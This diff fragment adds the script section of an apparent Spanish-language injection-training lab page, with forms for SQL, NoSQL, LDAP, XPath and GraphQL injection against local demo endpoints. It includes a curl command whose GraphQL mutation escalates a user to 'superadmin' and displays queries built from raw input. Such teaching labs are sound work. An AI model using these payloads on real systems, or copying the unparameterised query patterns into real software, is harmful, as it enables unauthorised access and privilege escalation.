+                        <pre class="command-code">curl -X POST http://localhost:3001/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"mutation { updateRole(userId:1, role:\"superadmin\") { id username role } }"}'</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+        // ── Partículas ────────────────────────────────────────────────
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 60; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            p.style.left = Math.random() * 100 + '%';
+            p.style.top = Math.random() * 100 + '%';
+            p.style.animationDelay = Math.random() * 7 + 's';
+            p.style.animationDuration = (5 + Math.random() * 5) + 's';
+            const size = 2 + Math.random() * 3;
+            p.style.width = size + 'px';
+            p.style.height = size + 'px';
+            particlesContainer.appendChild(p);
+        }
+
+        // ── Navegación por tabs ──────────────────────────────────────
+        const tabs = document.querySelectorAll('.nav-tab');
+        const panels = document.querySelectorAll('.injection-panel');
+
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const target = tab.dataset.tab;
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                panels.forEach(p => {
+                    p.classList.remove('active');
+                    if (p.id === 'panel' + target.charAt(0).toUpperCase() + target.slice(1)) {
+                        p.classList.add('active');
+                    }
+                });
+                // Map tab names to panel IDs
+                const panelMap = {
+                    sql: 'panelSQL',
+                    nosql: 'panelNoSQL',
+                    ldap: 'panelLDAP',
+                    xpath: 'panelXPath',
+                    graphql: 'panelGraphQL'
+                };
+                panels.forEach(p => p.classList.remove('active'));
+                const targetPanel = document.getElementById(panelMap[target]);
+                if (targetPanel) targetPanel.classList.add('active');
+            });
+        });
+
+        // ── Utilidades ───────────────────────────────────────────────
+        function showMessage(containerId, text, type) {
+            const container = document.getElementById(containerId);
+            const icon = type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ';
+            container.innerHTML = `<div class="message ${type}">${icon} ${text}</div>`;
+            setTimeout(() => {
+                const msg = container.querySelector('.message');
+                if (msg) msg.classList.add('show');
+            }, 10);
+        }
+
+        function setLoading(btn, loading) {
+            const text = btn.querySelector('.btn-text');
+            const loader = btn.querySelector('.btn-loader');
+            text.style.display = loading ? 'none' : 'inline';
+            loader.style.display = loading ? 'flex' : 'none';
+            btn.disabled = loading;
+        }
+
+        // ── Payload click-to-fill ────────────────────────────────────
+        document.querySelectorAll('.payload-card').forEach(card => {
+            card.addEventListener('click', () => {
+                const target = card.dataset.target;
+                const payload = card.dataset.payload;
+                if (target && payload) {
+                    document.getElementById(target).value = payload;
+                }
+                const target2 = card.dataset.target2;
+                const payload2 = card.dataset.payload2;
+                if (target2 && payload2) {
+                    document.getElementById(target2).value = payload2;
+                }
+                // Visual feedback
+                card.classList.add('filled');
+                setTimeout(() => card.classList.remove('filled'), 600);
+            });
+        });
+
+        // ── Copy buttons ─────────────────────────────────────────────
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const text = btn.dataset.copy;
+                navigator.clipboard.writeText(text).then(() => {
+                    const orig = btn.textContent;
+                    btn.textContent = '✅ Copiado';
+                    setTimeout(() => btn.textContent = orig, 1500);
+                });
+            });
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // SQL INJECTION FORM
+        // ═══════════════════════════════════════════════════════════════
+        document.getElementById('sqlForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('.btn-inject');
+            setLoading(btn, true);
+            document.getElementById('sqlMessage').innerHTML = '';
+
+            const usuario = document.getElementById('sqlUsuario').value;
+            const contrasena = document.getElementById('sqlContrasena').value;
+
+            try {
+                const res = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario, contrasena })
+                });
+                const data = await res.json();
+
+                // Show the generated query
+                const queryDisplay = document.getElementById('sqlQueryDisplay');
+                queryDisplay.style.display = 'block';
+                document.getElementById('sqlQueryCode').textContent =
+                    `SELECT * FROM usuarios WHERE usuario = '${usuario}' AND contrasena = '${contrasena}'`;
+
+                if (data.success) {
+                    showMessage('sqlMessage', data.message, 'success');
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
+                } else {
+                    showMessage('sqlMessage', data.message, 'error');
+                }
+            } catch (err) {
+                showMessage('sqlMessage', 'Error de conexión', 'error');
+            } finally {
+                setLoading(btn, false);
+            }
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // NoSQL INJECTION FORM
+        // ═══════════════════════════════════════════════════════════════
+        document.getElementById('nosqlForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('.btn-inject');
+            setLoading(btn, true);
+            document.getElementById('nosqlMessage').innerHTML = '';
+
+            let usuario = document.getElementById('nosqlUsuario').value;
+            let contrasena = document.getElementById('nosqlContrasena').value;
+
+            // Try to parse as JSON objects
+            try { usuario = JSON.parse(usuario); } catch (e) { /* keep as string */ }
+            try { contrasena = JSON.parse(contrasena); } catch (e) { /* keep as string */ }
+
+            try {
+                const res = await fetch('/nosql-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario, contrasena })
+                });
+                const data = await res.json();
+
+                const queryDisplay = document.getElementById('nosqlQueryDisplay');
+                queryDisplay.style.display = 'block';
+                document.getElementById('nosqlQueryCode').textContent =
+                    `db.users.findOne(${JSON.stringify({ usuario, contrasena }, null, 2)})`;
+
+                showMessage('nosqlMessage', data.message, data.success ? 'success' : 'error');
+                if (data.success) {
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
+                }
+            } catch (err) {
+                showMessage('nosqlMessage', 'Error de conexión', 'error');
+            } finally {
+                setLoading(btn, false);
+            }
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // LDAP INJECTION FORM
+        // ═══════════════════════════════════════════════════════════════
+        document.getElementById('ldapForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('.btn-inject');
+            setLoading(btn, true);
+            document.getElementById('ldapMessage').innerHTML = '';
+
+            const usuario = document.getElementById('ldapUsuario').value;
+            const contrasena = document.getElementById('ldapContrasena').value;
+
+            try {
+                const res = await fetch('/ldap-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario, contrasena })
+                });
+                const data = await res.json();
+
+                const queryDisplay = document.getElementById('ldapQueryDisplay');
+                queryDisplay.style.display = 'block';
+                document.getElementById('ldapQueryCode').textContent = data.filter || `(&(uid=${usuario})(userPassword=${contrasena}))`;
+
+                showMessage('ldapMessage', data.message, data.success ? 'success' : 'error');
+                if (data.success) {
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
+                }
+            } catch (err) {
+                showMessage('ldapMessage', 'Error de conexión', 'error');
+            } finally {
+                setLoading(btn, false);
+            }
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // XPath INJECTION FORM
+        // ═══════════════════════════════════════════════════════════════
+        document.getElementById('xpathForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('.btn-inject');
+            setLoading(btn, true);
+            document.getElementById('xpathMessage').innerHTML = '';
+
+            const usuario = document.getElementById('xpathUsuario').value;
+            const contrasena = document.getElementById('xpathContrasena').value;
+
+            try {
+                const res = await fetch('/xpath-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario, contrasena })
+                });
+                const data = await res.json();
+
+                const queryDisplay = document.getElementById('xpathQueryDisplay');
+                queryDisplay.style.display = 'block';
+                document.getElementById('xpathQueryCode').textContent = data.query || `//user[username/text()='${usuario}' and password/text()='${contrasena}']`;
+
+                showMessage('xpathMessage', data.message, data.success ? 'success' : 'error');
+                if (data.success) {
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
+                }
+            } catch (err) {
+                showMessage('xpathMessage', 'Error de conexión', 'error');
+            } finally {
+                setLoading(btn, false);
+            }
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // GraphQL INJECTION FORM
+        // ═══════════════════════════════════════════════════════════════
+        document.getElementById('graphqlForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = e.target.querySelector('.btn-inject');
+            setLoading(btn, true);
+            document.getElementById('graphqlMessage').innerHTML = '';
+
+            const query = document.getElementById('graphqlQuery').value;
+
+            try {
+                const res = await fetch('/graphql', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ query })
+                });
+                const data = await res.json();
+
+                const queryDisplay = document.getElementById('graphqlQueryDisplay');
+                queryDisplay.style.display = 'block';
+                document.getElementById('graphqlQueryCode').textContent = JSON.stringify(data, null, 2);
+
+                if (data.errors) {
+                    showMessage('graphqlMessage', 'Error en la consulta GraphQL', 'error');
+                } else {
+                    showMessage('graphqlMessage', '✅ Consulta ejecutada exitosamente — redirigiendo al dashboard...', 'success');
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
+                }
+            } catch (err) {
+                showMessage('graphqlMessage', 'Error de conexión', 'error');
+            } finally {
+                setLoading(btn, false);
+            }
+        });
+    </script>
+</body>
+
+</html>
